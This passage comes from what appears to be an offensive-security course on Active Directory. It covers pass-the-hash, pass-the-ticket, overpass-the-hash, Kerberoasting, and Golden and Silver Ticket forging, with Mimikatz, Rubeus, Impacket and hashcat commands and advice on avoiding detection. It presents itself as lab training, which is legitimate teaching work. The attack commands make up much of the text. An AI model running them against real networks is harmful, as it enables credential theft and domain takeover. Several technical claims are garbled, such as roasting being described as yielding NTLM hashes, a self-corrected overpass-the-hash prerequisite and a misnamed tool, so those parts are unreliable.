timestamp and crack it offline to recover the user&#39;s NTLM hash.</p>\n</li>\n<li><p><strong>Service Principal Names (SPNs):</strong> These are unique identifiers for service instances. They are associated with a computer account (e.g., <code>HOST/server.domain.com</code>) or a user account (e.g., <code>MSSQLSvc/db.domain.com:1433</code>). When a client wants to access a service, it asks the KDC for a service ticket for that service&#39;s SPN. The KDC looks up which account the SPN is registered to and encrypts the service ticket with <em>that account&#39;s</em> password hash. This is the Achilles&#39; heel Kerberoasting exploits.</p>\n</li>\n</ul>\n<hr>\n<h3><strong>6.2 Pass-the-Hash (PtH)</strong></h3>\n<p>PtH is a classic technique that exploits the NTLM protocol&#39;s reliance on the password hash rather than the password itself. If you have a user&#39;s NTLM hash, you can authenticate to resources that accept NTLM authentication as that user.</p>\n<ul>\n<li><p><strong>Concept:</strong> Authenticate using the user&#39;s NTLM hash instead of their plaintext password.</p>\n</li>\n<li><p><strong>Requirements:</strong> The user&#39;s NTLM hash and access to a system or tool that can perform PtH. The target system must support NTLM authentication.</p>\n</li>\n<li><p><strong>Common Targets:</strong> File shares (SMB/CIFS), WMI, PsExec, SQL databases, RDP (in some configurations).</p>\n</li>\n<li><p><strong>Tools &amp; Techniques:</strong></p>\n<ul>\n<li><p><strong>Mimikatz:</strong> The go-to tool for Windows credential manipulation.</p>\n<ul>\n<li>First, you often need to dump credentials, including hashes, from LSASS.</li>\n</ul>\n<pre><code class=\"language-powershell\"># Requires administrator privileges on the target host\n# Make sure to download and execute Mimikatz carefully, AV will flag it!\n# Method 1: Direct execution (often blocked by AV/EDR)\n# mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit\n\n# Method 2: Load into PowerShell (requires admin)\n# Import-Module .\\Invoke-Mimikatz.ps1\n# Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;&#39;\n</code></pre>\n<ul>\n<li>Once you have hashes (e.g., <code>UserA::DOMAIN:LMHASH:NTHASH:::</code>), you can use the <code>sekurlsa::pth</code> command.</li>\n</ul>\n<pre><code class=\"language-powershell\"># Example: Using Mimikatz to launch a command prompt with PtH\n# Replace DOMAIN, UserA, and NTHASH with harvested values\nmimikatz.exe &quot;sekurlsa::pth /user:UserA /domain:DOMAIN /ntlm:NTHASH /run:cmd.exe&quot; exit\n</code></pre>\n<p>This will pop a new command prompt running under the context of <code>DOMAIN\\UserA</code>, authenticated via PtH using only the NTLM hash. You can then use this prompt to access resources that <code>UserA</code> has access to (e.g., <code>dir \\\\server\\share</code>).</p>\n</li>\n<li><p><strong>Impacket (Python Toolkit):</strong> Excellent cross-platform tools for interacting with Windows services, often supporting PtH. Run these from your attacker machine (e.g., Kali).</p>\n<ul>\n<li><strong><code>psexec.py</code>:</strong> Executes commands remotely (like Sysinternals PsExec).</li>\n</ul>\n<pre><code class=\"language-bash\"># Authenticate using hash to run cmd.exe on TargetServer\n# Replace DOMAIN, UserA, NTHASH, and TargetServer\npsexec.py DOMAIN/UserA@TargetServer -hashes :NTHASH\n# Or if you don&#39;t know the domain, sometimes just user@target is enough\n# psexec.py UserA@TargetServer -hashes :NTHASH\n</code></pre>\n<ul>\n<li><strong><code>wmiexec.py</code>:</strong> Executes commands remotely via WMI. Often less detected than PsExec.</li>\n</ul>\n<pre><code class=\"language-bash\"># Authenticate using hash to run cmd.exe on TargetServer via WMI\n# Replace DOMAIN, UserA, NTHASH, and TargetServer\nwmiexec.py DOMAIN/UserA@TargetServer -hashes :NTHASH\n</code></pre>\n<ul>\n<li><strong><code>smbexec.py</code>:</strong> Executes commands remotely via SMB (creates a service like PsExec but can be stealthier).</li>\n</ul>\n<pre><code class=\"language-bash\"># Authenticate using hash to run cmd.exe on TargetServer via SMB\n# Replace DOMAIN, UserA, NTHASH, and TargetServer\nsmbexec.py DOMAIN/UserA@TargetServer -hashes :NTHASH\n</code></pre>\n<ul>\n<li><strong>Accessing File Shares:</strong> You can also use tools like <code>smbclient.py</code> or <code>crackmapexec</code> with hashes.</li>\n</ul>\n<pre><code class=\"language-bash\"># List shares on TargetServer using crackmapexec with hash\n# Replace DOMAIN, UserA, NTHASH, and TargetServer\ncrackmapexec smb TargetServer -d DOMAIN -u UserA -H NTHASH\n\n# Access a specific share using smbclient.py with hash\n# Replace DOMAIN, UserA, NTHASH, TargetServer, and ShareName\nsmbclient.py DOMAIN/UserA@TargetServer -hashes :NTHASH -share ShareName\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>Successful NTLM authentication events (Event ID 4776 on DCs, 4624 on target host) will be logged. The logon type might be different than interactive.</li>\n<li>Network traffic will show NTLMv2 challenge/response, but the actual password isn&#39;t sent.</li>\n<li>Using tools like PsExec creates services on the target host, which can be noisy. WMI and SMBExec might be quieter.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>6.3 Pass-the-Ticket (PtT)</strong></h3>\n<p>PtT leverages stolen Kerberos tickets (TGTs or TGSs) to authenticate to resources. Since the ticket itself represents proof of authentication, you don&#39;t need the password or hash.</p>\n<ul>\n<li><p><strong>Concept:</strong> Authenticate using a valid Kerberos ticket instead of a password or hash.</p>\n</li>\n<li><p><strong>Requirements:</strong> A valid Kerberos ticket file (<code>.kirbi</code> extension is common) and access to a system where you can inject the ticket into the current user&#39;s session/credential cache.</p>\n</li>\n<li><p><strong>Common Targets:</strong> Any service or resource that uses Kerberos authentication (most domain resources by default).</p>\n</li>\n<li><p><strong>Tools &amp; Techniques:</strong></p>\n<ul>\n<li><p><strong>Mimikatz:</strong> Again, a primary tool. You first need to extract tickets from memory.</p>\n<pre><code class=\"language-powershell\"># Requires administrator privileges\n# Dump Kerberos tickets from LSASS\n# mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit\n# This exports tickets to .kirbi files in the current directory\n</code></pre>\n<ul>\n<li>Once you have <code>.kirbi</code> files (e.g., <code>TGT_UserA@DOMAIN.TGT.kirbi</code>, <code>TGS_UserA@DOMAIN_Service@Server.TGS.kirbi</code>), you can inject them.</li>\n</ul>\n<pre><code class=\"language-powershell\"># Inject a TGT ticket (allows requesting new service tickets)\n# Replace path_to_ticket.kirbi\nmimikatz.exe &quot;kerberos::ptt path_to_ticket.kirbi&quot; exit\n\n# Inject a TGS ticket (allows accessing the specific service/resource it&#39;s for)\n# Replace path_to_ticket.kirbi\nmimikatz.exe &quot;kerberos::ptt path_to_ticket.kirbi&quot; exit\n</code></pre>\n<ul>\n<li>After injecting a ticket, you can verify it using <code>klist</code> in a command prompt.</li>\n</ul>\n<pre><code class=\"language-cmd\">klist\n</code></pre>\n<p>You should see the injected ticket listed. You can then access resources as that user.</p>\n</li>\n<li><p><strong>Rubeus:</strong> A C# Kerberos interaction toolkit, often preferred for its flexibility and less signature-based detection compared to Mimikatz&#39;s executable.</p>\n<ul>\n<li>Dump tickets using Rubeus (from a privileged shell):</li>\n</ul>\n<pre><code class=\"language-powershell\"># Requires administrator privileges\n# Download Rubeus.exe\n# Execute Rubeus from PowerShell\n.\\Rubeus.exe dump /luid:0 # Dump tickets for the current logon session (often 0 for SYSTEM)\n.\\Rubeus.exe dump /service:krbtgt # Dump the krbtgt ticket (very powerful!)\n</code></pre>\n<ul>\n<li>Inject tickets using Rubeus:</li>\n</ul>\n<pre><code class=\"language-powershell\"># Inject a ticket from a .kirbi file\n.\\Rubeus.exe ptt /ticket:path_to_ticket.kirbi\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>The <code>klist</code> command run by the OS shows the injected tickets.</li>\n<li>Successful Kerberos authentication events (Event ID 4768 - TGT request, 4769 - TGS request, 4624 - Logon) will be logged on DCs and target hosts. The source of the request might be unusual (e.g., a host not typically used by that user).</li>\n<li>Less network noise initially compared to PtH, as the ticket is reused.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>6.4 Overpass-the-Hash (OtH)</strong></h3>\n<p>OtH is a technique to obtain a Kerberos TGT using an NTLM hash. This is useful when you have a hash but prefer to use Kerberos for subsequent lateral movement or resource access, or when NTLM authentication might be blocked or more heavily monitored.</p>\n<ul>\n<li><p><strong>Concept:</strong> Use a user&#39;s NTLM hash to request a Kerberos TGT from the KDC.</p>\n</li>\n<li><p><strong>Requirements:</strong> The user&#39;s NTLM hash (or AES key, which is even better but harder to get), the user&#39;s SID, the domain name, and the NTLM hash of the <code>krbtgt</code> account (or its AES key). <em>Wait, getting the <code>krbtgt</code> hash requires domain admin or equivalent!</em> Yes, OtH often comes <em>after</em> some level of compromise or in specific scenarios. However, there are variations where you might request a TGT for a <em>different</em> user using a hash you <em>do</em> have. The core idea is using a hash to <em>request</em> a ticket. A common use case is using a user hash to request their TGT, then using that TGT for PtT.</p>\n</li>\n<li><p><strong>Tools &amp; Techniques:</strong></p>\n<ul>\n<li><p><strong>Mimikatz:</strong> Can generate tickets using hashes or keys.</p>\n<pre><code class=\"language-powershell\"># This is often used for Golden Ticket (M7), but the principle applies\n# Requesting a TGT using NTLM hash (requires krbtgt hash or key for full forge)\n# More commonly used for Golden Ticket forging (any user TGT)\n# mimikatz.exe &quot;kerberos::golden /user:UserA /domain:DOMAIN.LOCAL /sid:S-1-5-21-...&quot; /krbtgt:krbtgt_NTHASH /ticket:outh_UserA.kirbi&quot; exit\n# Then use kerberos::ptt outh_UserA.kirbi\n</code></pre>\n<ul>\n<li><em>Correction:</em> While Mimikatz <em>can</em> forge tickets, the simpler OtH concept (using a hash to <em>request</em> a legitimate TGT from the KDC) is often done via Rubeus or Impacket. Mimikatz&#39;s <code>kerberos::ptt</code> can inject a ticket <em>you already have</em>. The &quot;Overpass&quot; part is the act of <em>requesting</em> the ticket with the hash.</li>\n</ul>\n</li>\n<li><p><strong>Rubeus:</strong> Excellent for requesting tickets.</p>\n<pre><code class=\"language-powershell\"># Request a TGT for UserA using their NTLM hash\n# Requires UserA&#39;s SID (can get via AD enumeration or whoami /user)\n.\\Rubeus.exe asktgt /user:UserA /domain:DOMAIN.LOCAL /rc4:UserA_NTHASH /ptt\n# The /ptt flag automatically injects the resulting TGT\n</code></pre>\n<p>This command tells Rubeus to act as UserA, use their NTLM hash (<code>/rc4:</code>) to encrypt the AS-REQ timestamp, send it to the DC, receive the AS-REP (containing the encrypted TGT), and inject it. You now have UserA&#39;s TGT via hash.</p>\n</li>\n<li><p><strong>Impacket:</strong> <code>getTGT.py</code> can also request TGTs using hashes.</p>\n<pre><code class=\"language-bash\"># Request TGT for UserA using NTLM hash and save to UserA.ccache\n# Replace DOMAIN, UserA, UserA_NTHASH, DC_IP\ngetTGT.py DOMAIN/UserA@DC_IP -hashes :UserA_NTHASH -dc-ip DC_IP\n# Output will be UserA.ccache - this is a ticket file format.\n# You can then use impacket tools with -k flag and KB5-CCACHE env var,\n# or convert to .kirbi and use Mimikatz/Rubeus ptt.\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>The KDC will log a successful AS-REQ (Event ID 4768) for the user. The authentication method might be logged (e.g., NTLM hash used for Kerberos authentication).</li>\n<li>Less noisy than PtH on the network <em>after</em> the TGT is obtained, as subsequent access uses Kerberos tickets.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>6.5 Kerberoasting</strong></h3>\n<p>This is a powerful technique to obtain password hashes of service accounts that are associated with user accounts (not computer accounts) by requesting and cracking their service tickets offline.</p>\n<ul>\n<li><p><strong>Concept:</strong> Request a Kerberos Service Ticket (TGS) for a Service Principal Name (SPN) registered to a <em>user</em> account. The TGS is encrypted with the target user account&#39;s NTLM hash. Capture the ticket and crack the hash offline.</p>\n</li>\n<li><p><strong>Requirements:</strong> An authenticated domain user session (even low privilege).</p>\n</li>\n<li><p><strong>Why it works:</strong> Any authenticated domain user can request a service ticket for <em>any</em> registered SPN in the domain. If that SPN maps to a user account, the ticket is encrypted with that user&#39;s password hash.</p>\n</li>\n<li><p><strong>The Steps:</strong></p>\n<ol>\n<li><strong>Enumerate SPNs:</strong> Find SPNs registered to user accounts.</li>\n<li><strong>Request Service Tickets:</strong> Request TGS tickets for the identified SPNs.</li>\n<li><strong>Export Tickets:</strong> Save the requested tickets in a crackable format.</li>\n<li><strong>Crack Hashes:</strong> Use a password cracker (Hashcat, John the Ripper) offline to recover the plaintext passwords from the NTLM hashes extracted from the tickets.</li>\n</ol>\n</li>\n<li><p><strong>Tools &amp; Techniques:</strong></p>\n<ul>\n<li><p><strong>PowerView (PowerSploit):</strong> Excellent PowerShell script for AD enumeration.</p>\n<pre><code class=\"language-powershell\"># Requires an active domain session (run from a domain-joined host or via remoting)\n# Import PowerView.ps1\n# Find all domain users with SPNs\nGet-DomainUser -SPN | Select-Object Name, SamAccountName, ServicePrincipalNames\n</code></pre>\n<p>This command lists users and their SPNs. Look for SPNs that seem unusual or are associated with user accounts you want to target.</p>\n</li>\n<li><p><strong>Rubeus:</strong> Can automate the entire process of requesting and formatting tickets for cracking.</p>\n<pre><code class=\"language-powershell\"># Requires an active domain session\n# Download Rubeus.exe\n# Execute Rubeus to perform Kerberoasting\n.\\Rubeus.exe kerberoast\n</code></pre>\n<p>This command performs the enumeration, requests tickets for found SPNs, and outputs the ticket data in a format suitable for Hashcat or John (hash mode 13100).</p>\n</li>\n<li><p><strong>Impacket:</strong> <code>GetUserSPNs.py</code> script.</p>\n<pre><code class=\"language-bash\"># Run from attacker machine (e.g., Kali)\n# Requires valid domain credentials (any domain user is usually enough)\n# Replace DOMAIN, User, Password, DC_IP\nGetUserSPNs.py DOMAIN/User:Password -dc-ip DC_IP\n# Or using a hash if you have one (PtH style)\n# GetUserSPNs.py DOMAIN/User@DC_IP -hashes :NTHASH -dc-ip DC_IP\n</code></pre>\n<p>This script also enumerates, requests, and outputs crackable hashes.</p>\n</li>\n<li><p><strong>Hashcat/John the Ripper:</strong> For offline cracking of the obtained hashes.</p>\n<ul>\n<li>Hashcat mode 13100 for Kerberoast hashes.</li>\n</ul>\n<pre><code class=\"language-bash\"># Assuming Rubeus/Impacket outputted to a file named hashes.txt\n# Replace /path/to/wordlist.txt\nhashcat -m 13100 hashes.txt /path/to/wordlist.txt --force # --force if run in VM/unsupported env\n</code></pre>\n<ul>\n<li>John the Ripper can often auto-detect the format if you use the <code>--format=krb5tgs</code> flag or just <code>john --wordlist=... hashes.txt</code>.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>Multiple TGS-REQ requests from a single user/host in a short period (Event ID 4769 on DCs). This is a primary detection vector.</li>\n<li>Requests for unusual or a large number of SPNs.</li>\n<li>Network traffic analysis might show unusual Kerberos activity.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>6.6 AS-REP Roasting</strong></h3>\n<p>AS-REP Roasting targets users with the &#39;Do not require Kerberos preauthentication&#39; flag set.</p>\n<ul>\n<li><strong>Concept:</strong> Identify users with the <code>DONT_REQ_PREAUTH</code> user account control flag. For these users, the initial Kerberos authentication request (AS-REQ) is not encrypted with their password hash. Requesting an AS-REQ for such a user allows capturing a portion of the response (the encrypted timestamp) that can be cracked offline to recover their NTLM hash.</li>\n<li><strong>Requirements:</strong> An authenticated domain user session (even low privilege).</li>\n<li><strong>Why it works:</strong> The vulnerability is in the specific user account setting (`</li>\n</ul>\n\n                </div>\n             </div>\n         ",
    "module-7": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 7: module_7</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, buckle up! We&#39;ve journeyed from a single compromised host, learned to find our way around, grab local goodies, elevate our access, hop between machines, and map out the entire Active Directory forest. Now, we&#39;re standing at the precipice of ultimate power within the domain.</p>\n<p>This is Module 7: <strong>Domain Dominance &amp; Persistence</strong>. This is where we transition from being just <em>on</em> the network to effectively <em>owning</em> it. We&#39;ll learn the techniques that allow attackers to seize control of the domain itself and, crucially, how to ensure that control persists even if our initial footholds are discovered and removed.</p>\n<p>This module is powerful. These techniques are the crown jewels of many advanced persistent threats (APTs) and red teams. With great power comes great responsibility ‚Äì remember, we are doing this to <em>learn</em> and <em>defend</em>. All practical exercises <em>must</em> be conducted in your isolated lab environment.</p>\n<hr>\n<h2>Module 7: Domain Dominance &amp; Persistence</h2>\n<p><strong>Module Objective:</strong> Achieve Domain Administrator privileges (or equivalent control) and establish persistent access within the Active Directory environment using advanced techniques.</p>\n<p><strong>Learning Goals:</strong> By the end of this module, you will be able to:</p>\n<ul>\n<li>Understand and leverage high-privilege credentials and tickets for domain control.</li>\n<li>Explain the theory and execute practical attacks like Golden and Silver Tickets.</li>\n<li>Identify and potentially exploit SIDHistory for cross-domain privilege escalation.</li>\n<li>Implement various methods for maintaining persistent access within an Active Directory domain.</li>\n<li>Discuss the operational security implications of domain-level actions.</li>\n</ul>\n<hr>\n<h3>7.1 Leveraging Attack Paths &amp; Targeting High-Value Accounts</h3>\n<p>We spent Module 5 meticulously mapping the Active Directory landscape with tools like PowerView and, most importantly, BloodHound. Module 6 equipped us with advanced credential attacks like Kerberoasting and AS-REP Roasting. Now, it&#39;s time to synthesize that information and execute.</p>\n<p><strong>Theory:</strong></p>\n<p>BloodHound isn&#39;t just pretty graphs; it&#39;s a sophisticated pathfinding engine. It takes the relationships (sessions, group memberships, ACLs, delegation rights, etc.) you enumerated and finds the <em>shortest paths</em> from your initial access point (or any user/computer you control) to your desired target (usually Domain Admins, but could be sensitive data, specific servers, etc.).</p>\n<p>Identifying high-value accounts means finding users or groups that possess privileges allowing control over significant parts of the domain. The ultimate prize is typically the <code>Domain Admins</code> group, but others like <code>Enterprise Admins</code>, <code>Builtin Administrators</code> (on DCs), <code>Backup Operators</code>, or even users with specific powerful rights (like <code>SeEnableDelegationPrivilege</code> or <code>GenericAll</code> on critical objects) can be targets.</p>\n<p><strong>Practical Application:</strong></p>\n<ol>\n<li><strong>Review BloodHound Output:</strong> Go back to your Neo4j database from Module 5.<ul>\n<li>Run queries like:<ul>\n<li><code>Find shortest paths to Domain Admins</code></li>\n<li><code>Find principals with unconstrained delegation</code></li>\n<li><code>Find high value targets</code></li>\n<li><code>Find Kerberoastable accounts</code> (if you haven&#39;t exploited them yet)</li>\n<li><code>Find computers where Domain Admins have sessions</code></li>\n</ul>\n</li>\n<li>Analyze the paths. Each edge in the graph represents a potential step (e.g., &quot;User X has session on Computer Y&quot;, &quot;User A is member of Group B&quot;, &quot;Computer Z has Admin rights on Computer W&quot;).</li>\n<li>Identify the <em>type</em> of relationship you need to exploit to move along the path. Is it a session you can hijack? A credential you can reuse (PtH/PtT)? A service ticket you can request and crack (Kerberoasting)? A misconfigured ACL you can leverage?</li>\n</ul>\n</li>\n<li><strong>Prioritize Targets:</strong> Focus on paths that seem most feasible based on the credentials/access you&#39;ve already obtained or believe you can obtain easily. A path involving Kerberoasting a few accounts might be quicker than finding a complex PE on a specific machine.</li>\n<li><strong>Execute Based on Path:</strong> This is where you apply techniques from Modules 3, 4, and 6.<ul>\n<li>If the path goes through a computer where a high-priv user has a session, use lateral movement techniques (M4) like PsExec, WMI, or PowerShell Remoting, potentially combined with harvested credentials (M6) or token impersonation (M3), to get onto that machine. Once there, maybe you can dump LSASS (M2) to get the user&#39;s current credentials or tickets.</li>\n<li>If the path involves a Kerberoastable user who is a member of a privileged group, execute the Kerberoasting attack (M6), crack the hash, and use the resulting cleartext password or NTLM hash for lateral movement or authentication.</li>\n<li>If the path involves a computer object with Unconstrained Delegation, compromising that computer allows you to potentially trick users into authenticating to it, capturing their TGTs.</li>\n<li>If the path involves weak ACLs on an Organizational Unit (OU) or group, you might be able to add your own user to a privileged group directly.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Example Walkthrough Idea (Conceptual):</strong></p>\n<ul>\n<li>BloodHound shows: <code>CompromisedUser</code> -&gt; <code>MemberOf</code> -&gt; <code>WorkstationAdmins</code> -&gt; <code>AdminTo</code> -&gt; <code>SensitiveServer</code> -&gt; <code>HasSession</code> -&gt; <code>DomainAdminUser</code>.</li>\n<li><em>Plan:</em><ol>\n<li>Use <code>CompromisedUser</code>&#39;s access.</li>\n<li>Leverage <code>WorkstationAdmins</code> membership (maybe they have admin rights on their own workstation).</li>\n<li>Find credentials on the workstation to get admin on <code>SensitiveServer</code> (lateral movement M4, M6).</li>\n<li>Once on <code>SensitiveServer</code>, look for sessions or credentials of <code>DomainAdminUser</code> (recon M2).</li>\n<li>Dump LSASS or find cached credentials for <code>DomainAdminUser</code>.</li>\n<li>Use <code>DomainAdminUser</code> credentials/hash/ticket to achieve Domain Admin access.</li>\n</ol>\n</li>\n</ul>\n<p>This section is less about <em>new</em> techniques and more about <em>applying</em> the techniques you&#39;ve learned in a strategic, data-driven way guided by AD enumeration.</p>\n<hr>\n<h3>7.2 Golden Ticket Attacks</h3>\n<p>This is one of the most powerful attacks against Active Directory. It allows you to forge a Ticket Granting Ticket (TGT) for <em>any</em> user in the domain, effectively granting you the ability to impersonate that user and access <em>any</em> resource within the domain (and potentially trusted domains).</p>\n<p><strong>Theory:</strong></p>\n<p>Kerberos authentication relies on a trusted third party: the Key Distribution Center (KDC), which is the Domain Controller. The KDC has a special account, <code>krbtgt</code>, whose NTLM hash is used to encrypt and sign TGTs. A TGT is like a long-term pass that proves your identity to the KDC. Once you have a TGT, you can request Service Tickets (TGSs) for specific services (like accessing a file share, running a remote command) without needing your password again.</p>\n<p>A Golden Ticket attack works by obtaining the <code>krbtgt</code> account&#39;s NTLM hash. With this hash, an attacker can manually <em>forge</em> a valid TGT for <em>any</em> user (even non-existent ones) with <em>any</em> group memberships (including Domain Admins, Enterprise Admins, etc.). This forged ticket is signed with the legitimate <code>krbtgt</code> hash, so the KDC and other services trust it implicitly.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>The NTLM hash of the <code>krbtgt</code> account.</li>\n<li>The Domain Name.</li>\n<li>The Domain SID.</li>\n<li>Administrator or SYSTEM privileges on <em>any</em> domain-joined machine to inject the ticket into a session (or use tools like Impacket from an attacker machine).</li>\n</ul>\n<p><strong>How to get the <code>krbtgt</code> hash:</strong></p>\n<p>The most common way is using the <code>DCSync</code> technique (covered in 7.3) from a machine with sufficient privileges (Domain Admins, Enterprise Admins, or specific ACLs). Alternatively, if you have administrative access on a Domain Controller, you can dump the NTDS.DIT database and extract the hash offline (e.g., using <code>secretsdump.py</code> or <code>dsntutil.exe</code> + <code>pypykatz</code>).</p>\n<p><strong>Practical Application (using Mimikatz):</strong></p>\n<p>Assume you have already obtained the <code>krbtgt</code> hash (e.g., <code>a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4</code>).</p>\n<ol>\n<li><p><strong>Get Domain SID:</strong> You can get this from any domain-joined machine.</p>\n<pre><code class=\"language-powershell\">whoami /user\n</code></pre>\n<p>Look for the SID string (e.g., `S-1-5-21-...). The portion before the last hyphen is the Domain SID.<br>Alternatively:</p>\n<pre><code class=\"language-powershell\">(Get-ADDomain).DomainSID\n</code></pre>\n<p>(Requires ActiveDirectory PowerShell module, which might not be on a standard compromised host, but is common on admin workstations or DCs).<br>Let&#39;s say the Domain SID is <code>S-1-5-21-1234567890-987654321-123456789</code>. The relevant part for Mimikatz is <code>1234567890-987654321-123456789</code>.</p>\n</li>\n<li><p><strong>Inject the Golden Ticket:</strong> Open Mimikatz (requires Administrator/SYSTEM).</p>\n<pre><code class=\"language-mimikatz\"># Ensure you have the necessary privileges\nprivilege::debug\n\n# Inject the golden ticket\n# Parameters:\n# /user: The username to impersonate (can be fake, e.g., &quot;administrator&quot; or &quot;pwnedadmin&quot;)\n# /domain: The FQDN of the domain (e.g., &quot;corp.local&quot;)\n# /sid: The Domain SID obtained in step 1\n# /krbtgt: The NTLM hash of the krbtgt account\n# /ptt: Pass The Ticket - injects the ticket into the current session\nkerberos::golden /user:pwnedadmin /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /ptt\n</code></pre>\n</li>\n<li><p><strong>Verify the Ticket:</strong> Use <code>klist</code> to view the Kerberos tickets in your current session. You should see a TGT for the user you specified, issued by <code>krbtgt</code>.</p>\n<pre><code class=\"language-cmd\">klist\n</code></pre>\n</li>\n<li><p><strong>Access Resources:</strong> Now, you can access any resource in the domain as <code>pwnedadmin</code> (which effectively has the privileges you assigned via the group memberships implied by the ticket).</p>\n<pre><code class=\"language-cmd\"># Access a file share on a Domain Controller\nnet use \\\\DC01.corp.local\\SYSVOL\n\n# Or run a command remotely on a DC using PsExec (assuming it&#39;s allowed)\n# This might require specific PsExec versions or configurations to use the injected ticket\n# A more reliable way might be to use Impacket&#39;s psexec.py with the ticket cache\n</code></pre>\n</li>\n</ol>\n<p><strong>Practical Application (using Rubeus):</strong></p>\n<p>Rubeus is a C# alternative to Mimikatz for Kerberos interaction, often preferred for its flexibility and less signatured nature compared to Mimikatz binaries.</p>\n<ol>\n<li><p><strong>Get Domain SID:</strong> Same as step 1 for Mimikatz.</p>\n</li>\n<li><p><strong>Inject the Golden Ticket:</strong></p>\n<pre><code class=\"language-powershell\"># Assuming you have Rubeus.exe accessible\n.\\Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /user:pwnedadmin /ptt\n</code></pre>\n<p>Rubeus offers more options, like specifying group SIDs to add to the ticket explicitly, which gives finer-grained control over the resulting privileges if you don&#39;t want full DA.</p>\n</li>\n<li><p><strong>Verify &amp; Access:</strong> Same as steps 3 &amp; 4 for Mimikatz.</p>\n</li>\n</ol>\n<p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>Injecting tickets modifies the current logon session&#39;s ticket cache, which <em>can</em> be detected by sophisticated endpoint monitoring.</li>\n<li>Accessing resources with a forged ticket generates logs on the target resource server and potentially the DC, but they will look like legitimate Kerberos authentications <em>from the user specified in the ticket</em>. The anomaly is the <em>source</em> machine from which the authentication originated if that machine isn&#39;t typically used by the impersonated user.</li>\n<li>Obtaining the <code>krbtgt</code> hash (often via DCSync) is a very high-privilege action that is heavily logged and monitored by defenders.</li>\n</ul>\n<hr>\n<h3>7.3 Silver Ticket Attacks</h3>\n<p>While a Golden Ticket grants access to <em>any</em> resource as <em>any</em> user, a Silver Ticket grants access to a <em>specific service</em> on a <em>specific server</em> as <em>any</em> user.</p>\n<p><strong>Theory:</strong></p>\n<p>Kerberos authentication for services uses Service Tickets (TGSs). A TGS is encrypted and signed with the NTLM hash of the <em>service account</em> or the <em>computer account</em> hosting the service. Forging a Silver Ticket involves obtaining the NTLM hash of the target server&#39;s computer account (or the hash of the specific service account if one is used and has an SPN) and using it to manually forge a valid TGS for a specific service on that server.</p>\n<p>Since the ticket is signed with the legitimate key (the server&#39;s hash), the target server trusts the ticket and grants access to the specified service, regardless of the actual user requesting it.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>The NTLM hash of the target server&#39;s computer account (e.g., <code>SERVER01$</code>).</li>\n<li>The Domain Name.</li>\n<li>The Domain SID.</li>\n<li>The Target Server&#39;s FQDN.</li>\n<li>The Service Name (SPN portion, e.g., <code>cifs</code>, <code>host</code>, <code>http</code>).</li>\n<li>Administrator or SYSTEM privileges on <em>any</em> domain-joined machine to inject the ticket.</li>\n</ul>\n<p><strong>How to get the target server&#39;s hash:</strong></p>\n<p>You need administrator privileges on the target server itself to dump its LSASS or registry hives (SAM/SECURITY) and extract the <code>SERVER01$</code> account&#39;s NTLM hash. Techniques from Module 2 and 3 (Local Enumeration, Credential Harvesting, Privilege Escalation) are relevant here.</p>\n<p><strong>Practical Application (using Mimikatz):</strong></p>\n<p>Assume you have obtained the target server&#39;s hash (e.g., <code>b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5</code>). Let&#39;s target the CIFS service (for file shares) on <code>FILESERVER01.corp.local</code>.</p>\n<ol>\n<li><p><strong>Get Domain SID &amp; Domain Name:</strong> Same as for Golden Ticket.</p>\n</li>\n<li><p><strong>Get Target Server Hash:</strong> Assumed obtained (e.g., via local admin + Mimikatz <code>lsadump::sam</code>).</p>\n</li>\n<li><p><strong>Identify Service Name:</strong> Common services include <code>cifs</code> (file shares), <code>host</code> (many things, including RDP), <code>http</code> (web services), <code>mssql</code> (SQL Server).</p>\n</li>\n<li><p><strong>Inject the Silver Ticket:</strong> Open Mimikatz (requires Administrator/SYSTEM).</p>\n<pre><code class=\"language-mimikatz\">privilege::debug\n\n# Inject the silver ticket\n# Parameters:\n# /user: The username to appear as in logs (can be fake, e.g., &quot;fakeuser&quot;)\n# /domain: The FQDN of the domain\n# /sid: The Domain SID\n# /target: The FQDN of the target server\n# /service: The service name (e.g., cifs)\n# /ntlm: The NTLM hash of the target server&#39;s computer account (SERVER01$)\n# /ptt: Pass The Ticket\nkerberos::silver /user:fakeuser /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /target:FILESERVER01.corp.local /service:cifs /ntlm:b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5 /ptt\n</code></pre>\n</li>\n<li><p><strong>Verify the Ticket:</strong> Use <code>klist</code>. You should see a TGS for <code>cifs/FILESERVER01.corp.local</code>.</p>\n<pre><code class=\"language-cmd\">klist\n</code></pre>\n</li>\n<li><p><strong>Access the Service:</strong> Now, you can access the specified service on the target server.</p>\n<pre><code class=\"language-cmd\"># Access a file share on FILESERVER01\nnet use \\\\FILESERVER01.corp.local\\sharename\n</code></pre>\n</li>\n</ol>\n<p><strong>Practical Application (using Rubeus):</strong></p>\n<pre><code class=\"language-powershell\"># Assuming you 